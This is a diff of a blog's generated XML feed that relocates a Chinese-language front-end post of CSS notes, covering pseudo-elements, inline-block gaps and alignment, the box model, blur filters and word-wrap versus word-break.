+<h2 id="letter-spacing-无法居中的问题"><a href="#letter-spacing-无法居中的问题" class="headerlink" title="letter-spacing 无法居中的问题"></a>letter-spacing 无法居中的问题</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">letter-spacing</span>: 20<span class="selector-tag">px</span>;</span><br><span class="line"><span class="selector-tag">text-indent</span>: 20<span class="selector-tag">px</span>;</span><br><span class="line"><span class="selector-tag">text-align</span><span class="selector-pseudo">:center</span>;</span><br></pre></td></tr></table></figure>
+<h2 id="blur"><a href="#blur" class="headerlink" title="blur"></a>blur</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">filter</span>: <span class="selector-tag">blur</span>(10<span class="selector-tag">px</span>);</span><br><span class="line"><span class="selector-tag">-webkit-filter</span>: <span class="selector-tag">blur</span>(10<span class="selector-tag">px</span>);</span><br><span class="line"><span class="selector-tag">-moz-filter</span>: <span class="selector-tag">blur</span>(10<span class="selector-tag">px</span>);</span><br><span class="line"><span class="selector-tag">-o-filter</span>: <span class="selector-tag">blur</span>(10<span class="selector-tag">px</span>);</span><br><span class="line"><span class="selector-tag">-ms-filter</span>: <span class="selector-tag">blur</span>(10<span class="selector-tag">px</span>);</span><br><span class="line">filter: progid:DXImageTransform.Microsoft.Blur(PixelRadius="4");</span><br></pre></td></tr></table></figure>
+<h2 id="work-wrap-amp-amp-work-break"><a href="#work-wrap-amp-amp-work-break" class="headerlink" title="work-wrap &amp;&amp; work-break"></a>work-wrap &amp;&amp; work-break</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">    666 asdjkhaksdhksdhkjahskajhsdasdasdaaskashdkasdhkad 872934729347</span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"></span><br><span class="line">span &#123;</span><br><span class="line">    word-wrap: break-word;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/css/css-31.png" alt=""></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">    666 asdjkhaksdhksdhkjahskajhsdasdasdaaskashdkasdhkad 872934729347</span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"></span><br><span class="line">span &#123;</span><br><span class="line">    word-break: break-all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/css/css-32.png" alt=""></p>
+<p><code>word-wrap: break-word</code> 会把过长的字符串换行再折断溢出部分，而<code>word-break: break-all</code> 会把过长的字符串在该行就将溢出的折断。</p>
+]]></content>
+      
+        <categories>
+            
+            <category> front-end </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> CSS </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[七个你可能不了解的CSS单位]]></title>
       <url>https://lucius0.github.io/2017/03/19/archivers/7-css-units-you-might-not-know-about/</url>
       <content type="html"><![CDATA[<p>我们很容易无法摆脱的使用我们所熟悉的CSS技术，当新的问题出现，这样会使我们处于不利的地位。</p>
@@ -3344,62 +3400,6 @@
 <script src="http://codepen.io/assets/embed/ei.js"> </script>
 
 <p>转自：<a href="https://www.w3cplus.com/css/7-css-units-you-might-not-know-about.html" target="_blank" rel="noopener">https://www.w3cplus.com/css/7-css-units-you-might-not-know-about.html</a></p>
-]]></content>
-      
-        <categories>
-            
-            <category> front-end </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> CSS </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[css的一些小记]]></title>
-      <url>https://lucius0.github.io/2017/03/19/archivers/css-notes/</url>
-      <content type="html"><![CDATA[<h2 id="before-和-after"><a href="#before-和-after" class="headerlink" title=":before 和 :after"></a>:before 和 :after</h2><p>伪类<code>:before</code>和<code>:after</code>默认是一个行内元素，所以这个元素设置<code>width/height</code>是无效的，就像给<code>a</code>元素设置<code>width/height</code>一样，但是可以通过设置<code>position:absolute;</code>，对这个元素的<code>display</code>属性计算为<code>inline-block</code>值，但是设置了<code>width/height</code>针对的是<code>:before/:after</code>生成的匿名替换元素，而不是其中的<code>content</code>。</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// 无效</span><br><span class="line">span:before &#123;</span><br><span class="line">    content: url(xxx.png);</span><br><span class="line">    width: 800px;</span><br><span class="line">    height: 600px;</span><br><span class="line">&#125;</span><br><span class="line">// 可以</span><br><span class="line">span:before &#123;</span><br><span class="line">    content: '';</span><br><span class="line">    background-image:url(xxx.png);</span><br><span class="line">    background-size:800px 600px;</span><br><span class="line">    width: 800px;</span><br><span class="line">    height: 600px;</span><br><span class="line">    position: absolute; // 设置定位类型</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="inline-block"><a href="#inline-block" class="headerlink" title="inline-block"></a>inline-block</h2><h3 id="元素间隔"><a href="#元素间隔" class="headerlink" title="元素间隔"></a>元素间隔</h3><p><code>inline-block</code>使得元素水平排列，但如果两个<code>inline-block</code>元素之间存在<strong>空格</strong>或者<strong>换行</strong>就会出现奇怪的元素间隔，即使使用了<code>{padding: 0; margin: 0}</code>。</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#text p &#123; display: inline-block; padding: 10px; background-color: red; color: #fff;&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"text"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>1<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>2<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/images/css/css-27.png" alt=""></p>
-<p>常见的解决方法：</p>
-<p>1、元素之间不要存在<strong>空格</strong>或者<strong>换行符</strong>；</p>
-<p>2、父容器的<code>font-size:0</code>。</p>
-<p>去除<code>inline-block</code>之间的间隔有很多种方法，可以参考张鑫旭老师的<a href="http://www.zhangxinxu.com/wordpress/2012/04/inline-block-space-remove-%E5%8E%BB%E9%99%A4%E9%97%B4%E8%B7%9D/" target="_blank" rel="noopener">去除inline-block元素间间距的N种方法</a></p>
-<h3 id="元素对齐问题"><a href="#元素对齐问题" class="headerlink" title="元素对齐问题"></a>元素对齐问题</h3><p>两<code>inline-block</code>元素，不存在文本的情况下</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#test p &#123;display: inline-block;&#125;</span><br><span class="line">.c1, .c2 &#123;width: 100px; height: 100px;&#125;</span><br><span class="line">.c1 &#123;border: 1px solid #f00;&#125;</span><br><span class="line">.c2 &#123;border: 1px solid #000;&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"test"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"c1"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"c2"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/images/css/css-28.png" alt=""></p>
-<p>两<code>inline-block</code>元素存在文本的情况下</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#test p &#123;display: inline-block;&#125;</span><br><span class="line">.c1, .c2 &#123;width: 100px; height: 100px;&#125;</span><br><span class="line">.c1 &#123;border: 1px solid #f00;&#125;</span><br><span class="line">.c2 &#123;border: 1px solid #000;&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"test"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"c1"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"c2"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/images/css/css-29.png" alt=""></p>
-<p>常见的解决方法：</p>
-<p>给图片或者背景设置<code>vertical-align: top</code>即可，或者给有文本的元素设置<code>overflow:hidden</code></p>
-<p>出现这种的原因是因为<code>inline-block</code>的默认属性是<code>vertical-align: baseline</code>，即以父元素的基线对齐，但当出现文本的时候，则会影响了对齐的基线。</p>
-<p>来自官方的答案：<a href="https://link.zhihu.com/?target=http%3A//www.w3.org/TR/CSS21/visudet.html%23leading" target="_blank" rel="noopener">“Visual formatting model details”</a></p>
-<blockquote>
-<p>The baseline of an ‘inline-block’ is the baseline of its last line box in the normal flow, unless it has either no in-flow line boxes or if its ‘overflow’ property has a computed value other than ‘visible’, in which case the baseline is the bottom margin edge.</p>
-</blockquote>
-<h2 id="盒模型"><a href="#盒模型" class="headerlink" title="盒模型"></a>盒模型</h2><p>页面上的每一个元素都可以看成一个盒模型。</p>
-<p><img src="/images/css/css-30.png" alt=""></p>
-<p>可以知道盒模型由四部分组成<code>content + padding + border + margin</code>，因此一个元素的宽度应该是：<code>总宽度 = margin-left + border-left + padding-left + width + padding-right + border-right + margin-right</code>。</p>
-<p>但是以上有问题的是，在<strong>IE(低于IE 9)</strong>的宽度为：<code>总宽度 = width + margin-right + margin-left</code>。因此出现了<code>box-sizing: border-box</code>的属性，当设置<code>box-sizing: border-box</code>属性时，<code>border</code> 和 <code>padding</code> 就被包含在了宽高之内，和 IE 之前的标准是一样的。</p>
-<h2 id="Chrome-小于12号字体"><a href="#Chrome-小于12号字体" class="headerlink" title="Chrome 小于12号字体"></a>Chrome 小于12号字体</h2><p>相对于其他的浏览器，chrome的默认最小字体只能是<code>12px</code>，无论你设置再小也是只能是<code>12px</code>，那假如有一个需求是要你兼容其他平台，包括chrome的字体表现小于<code>12px</code>的呢？可以使用css3的一个属性<code>transform: scale(n)</code>。</p>
-<h2 id="text-overflow-ellipsis"><a href="#text-overflow-ellipsis" class="headerlink" title="text-overflow: ellipsis"></a>text-overflow: ellipsis</h2><p><strong>多行文本</strong>在当前标准是不支持<code>text-overflow: ellipsis</code>。在草案中有一个不规范的属性<code>-webkit-line-clamp: &lt;number&gt;</code> <a href="http://developer.apple.com/safari/library/documentation/AppleApplications/Reference/SafariCSSRef/Articles/StandardCSSProperties.html#//apple_ref/doc/uid/TP30001266-UnsupportedProperties" target="_blank" rel="noopener">(unsupported WebKit property)</a>倒是可以支持这一需求，但是目前也只是在草案中。<code>text-overflow: ellipsis</code>需要<code>overflow: hidden</code>跟<code>white-space: nowrap</code>的支持，在IE 6还需要给元素设置<strong>宽度</strong>，至于多行文本，可以用<em>Jquery插件</em>的<em>Jquery-dotdotdot</em>，或者通过伪元素<code>:after</code>也可以很巧妙的解决这个问题。</p>
-<p>在此帖一下张老师的分析以及他的方案：<a href="http://www.zhangxinxu.com/wordpress/2009/09/%E5%85%B3%E4%BA%8E%E6%96%87%E5%AD%97%E5%86%85%E5%AE%B9%E6%BA%A2%E5%87%BA%E7%94%A8%E7%82%B9%E7%82%B9%E7%82%B9-%E7%9C%81%E7%95%A5%E5%8F%B7%E8%A1%A8%E7%A4%BA/" target="_blank" rel="noopener">关于文字内容溢出用点点点(…)省略号表示</a></p>
-<h2 id="letter-spacing-无法居中的问题"><a href="#letter-spacing-无法居中的问题" class="headerlink" title="letter-spacing 无法居中的问题"></a>letter-spacing 无法居中的问题</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">letter-spacing</span>: 20<span class="selector-tag">px</span>;</span><br><span class="line"><span class="selector-tag">text-indent</span>: 20<span class="selector-tag">px</span>;</span><br><span class="line"><span class="selector-tag">text-align</span><span class="selector-pseudo">:center</span>;</span><br></pre></td></tr></table></figure>
-<h2 id="blur"><a href="#blur" class="headerlink" title="blur"></a>blur</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">filter</span>: <span class="selector-tag">blur</span>(10<span class="selector-tag">px</span>);</span><br><span class="line"><span class="selector-tag">-webkit-filter</span>: <span class="selector-tag">blur</span>(10<span class="selector-tag">px</span>);</span><br><span class="line"><span class="selector-tag">-moz-filter</span>: <span class="selector-tag">blur</span>(10<span class="selector-tag">px</span>);</span><br><span class="line"><span class="selector-tag">-o-filter</span>: <span class="selector-tag">blur</span>(10<span class="selector-tag">px</span>);</span><br><span class="line"><span class="selector-tag">-ms-filter</span>: <span class="selector-tag">blur</span>(10<span class="selector-tag">px</span>);</span><br><span class="line">filter: progid:DXImageTransform.Microsoft.Blur(PixelRadius="4");</span><br></pre></td></tr></table></figure>
-<h2 id="work-wrap-amp-amp-work-break"><a href="#work-wrap-amp-amp-work-break" class="headerlink" title="work-wrap &amp;&amp; work-break"></a>work-wrap &amp;&amp; work-break</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">    666 asdjkhaksdhksdhkjahskajhsdasdasdaaskashdkasdhkad 872934729347</span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"></span><br><span class="line">span &#123;</span><br><span class="line">    word-wrap: break-word;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="/images/css/css-31.png" alt=""></p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">    666 asdjkhaksdhksdhkjahskajhsdasdasdaaskashdkasdhkad 872934729347</span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"></span><br><span class="line">span &#123;</span><br><span class="line">    word-break: break-all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="/images/css/css-32.png" alt=""></p>
-<p><code>word-wrap: break-word</code> 会把过长的字符串换行再折断溢出部分，而<code>word-break: break-all</code> 会把过长的字符串在该行就将溢出的折断。</p>
 ]]></content>
       
         <categories>
